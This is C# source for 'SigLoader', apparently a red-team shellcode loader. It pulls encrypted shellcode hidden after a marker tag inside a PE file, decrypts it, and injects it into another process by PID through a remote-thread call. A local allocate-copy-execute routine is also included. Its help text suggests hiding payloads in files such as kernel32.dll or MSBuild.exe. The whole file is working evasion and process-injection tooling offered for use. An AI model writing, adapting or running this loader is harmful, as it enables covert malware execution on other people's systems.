using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace SigLoader
{
    public class Program
    {
        public static string _pePath = "";
        public static string _encKey = "";
        public static string _pid = "";
        public static byte[] _tag = { 0xfe, 0xed, 0xfa, 0xce, 0xfe, 0xed, 0xfa, 0xce };
        public static void Main(string[] args)
        {
            ArgumentParser _parser = new ArgumentParser(args);

            if (args.Length <= 0 || _parser.GetOrDefault("h", "help") == "true") {
                Help();
            }


            if (_parser.GetOrDefault("f", "null") != "null") {
                _pePath = _parser.GetOrDefault("f", "null");
                _encKey = _parser.GetOrDefault("e", "null");
                _pid = _parser.GetOrDefault("pid", "null");

                if (_pePath == "null") Help();
                if (_pid == "null") Help();
            }

            else {
                Help();
            }

            if (!File.Exists(_pePath)) Help();

            Console.WriteLine("[+]:Loading/Parsing PE File '{0}'", _pePath);
            Console.WriteLine();

            byte[] _peBlob = Utils.Read(_pePath);
            int _dataOffset = Utils.scanPattern(_peBlob, _tag);

            Console.WriteLine("[+]:Scanning for Shellcode...");
            if ( _dataOffset == -1) {
                Console.WriteLine("Could not locate data or shellcode");
                Environment.Exit(0);
            }

            Stream stream = new MemoryStream(_peBlob);
            long pos = stream.Seek(_dataOffset + _tag.Length, SeekOrigin.Begin);
            Console.WriteLine("[+]: Shellcode located at {0:x2}", pos);
            byte[] shellcode = new byte[_peBlob.Length - (pos + _tag.Length)];
            stream.Read(shellcode, 0, (_peBlob.Length)- ((int)pos + _tag.Length));
            byte[] _data = Utils.Decrypt(shellcode, _encKey);
            
            stream.Close();

            //Execute shellcode (just a basic/vanilla local shellcode injection logic, make sure to CHANGE this and use your custom shellcode loader.
            
            //CreateThread
            //ExecShellcode(_data);

            //CreateRemoteThread 
            Loader.rexec(Convert.ToInt32(_pid), _data);
           

            }

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll")]
        public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        public static void ExecShellcode(byte[] shellcode)
        {
            uint threadId;

            IntPtr alloc = VirtualAlloc(IntPtr.Zero, shellcode.Length, 0x1000 | 0x2000, 0x40);
            if (alloc == IntPtr.Zero)
            {
                return;
            }

            Marshal.Copy(shellcode, 0, alloc, shellcode.Length);
            IntPtr threadHandle = CreateThread(IntPtr.Zero, 0, alloc, IntPtr.Zero, 0, out threadId);
            WaitForSingleObject(threadHandle, 0xFFFFFFFF);
        }

        public static void Help()
        {
            Console.WriteLine();
            Console.WriteLine("Usage:");
            Console.WriteLine(@"   c:\> SigLoader.exe -f <PE_FILE_PATH> -e <ENCRYPTION_KEY> -pid <PROCESS_ID>");
            Console.WriteLine();
            Console.WriteLine(@"   c:\> SigLoader.exe -f C:\Temp\kernel32.dll -e TestKey -pid <PROCESS_ID>");
            Console.WriteLine(@"   c:\> SigLoader.exe -f C:\Temp\MSBuild.exe -e TestKey -pid <PROCESS_ID>");
            Environment.Exit(0);
        }


    }
}
